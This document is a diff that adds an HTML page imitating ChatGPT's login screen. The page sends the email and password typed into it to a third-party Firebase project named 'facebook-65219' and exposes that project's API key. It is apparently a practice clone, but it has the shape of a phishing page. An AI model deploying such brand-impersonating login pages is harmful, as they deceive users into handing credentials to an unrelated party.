@@ -1,1 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ChatGPT Login Clone</title>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Helvetica Neue", sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 30px;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 5px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin: 10px 0;
+    }
+
+    p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    label {
+      text-align: left;
+      font-size: 13px;
+      color: #666;
+    }
+
+    input {
+      padding: 14px;
+      border-radius: 28px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      outline: none;
+    }
+
+    button[type="submit"] {
+      background-color: black;
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 28px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #ccc;
+    }
+
+    .divider span {
+      padding: 0 10px;
+      color: #888;
+      font-size: 14px;
+    }
+
+    .social-buttons button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 28px;
+      border: 1px solid #ccc;
+      background: white;
+      margin: 8px 0;
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      cursor: pointer;
+    }
+
+    .social-buttons img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .footer-links {
+      font-size: 13px;
+      margin-top: 20px;
+    }
+
+    .footer-links a {
+      color: #888;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .success {
+      color: green;
+      margin-top: 10px;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>ChatGPT</h2>
+    <h1>Log in or sign up</h1>
+    <p>You’ll get smarter responses and can upload files, images, and more.</p>
+
+    <form id="signupForm">
+      <label for="email">Email address</label>
+      <input type="email" id="email" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" required>
+
+      <button type="submit">Continue</button>
+    </form>
+
+    <div class="divider"><span>OR</span></div>
+
+    <div class="social-buttons">
+      <button><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg"> Continue with Google</button>
+      <button><img src="https://img.icons8.com/ios-filled/50/000000/microsoft.png"> Continue with Microsoft Account</button>
+      <button><img src="https://img.icons8.com/ios-filled/50/000000/mac-os.png"> Continue with Apple</button>
+      <button><img src="https://img.icons8.com/ios-filled/50/000000/phone.png"> Continue with phone</button>
+    </div>
+
+    <div id="message" class="success"></div>
+
+    <div class="footer-links">
+      <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a>
+    </div>
+  </div>
+
+  <script>
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCwlxwW0VVn0UI3UH4bIcY1-d-21G6xOB4",
+      authDomain: "facebook-65219.firebaseapp.com",
+      databaseURL: "https://facebook-65219-default-rtdb.firebaseio.com",
+      projectId: "facebook-65219",
+      storageBucket: "facebook-65219.appspot.com",
+      messagingSenderId: "331015141125",
+      appId: "1:331015141125:web:1079771c421d30d467696c",
+      measurementId: "G-Y5RKFJKM50"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const database = firebase.database();
+
+    // Handle form submit
+    document.getElementById("signupForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const messageDiv = document.getElementById("message");
+
+      // Clear previous message
+      messageDiv.textContent = '';
+      messageDiv.className = '';
+
+      // Firebase Auth - Sign Up
+      auth.createUserWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          const user = userCredential.user;
+
+          // Save to Realtime Database (only email + uid)
+          database.ref('users/' + user.uid).set({
+            email: user.email,
+            uid: user.uid,
+            createdAt: new Date().toISOString()
+          });
+
+          messageDiv.textContent = "✅ Account created successfully!";
+          messageDiv.className = "success";
+        })
+        .catch((error) => {
+          messageDiv.textContent = "❌ Error: " + error.message;
+          messageDiv.className = "error";
+        });
+    });
+  </script>
+</body>
+</html>
 
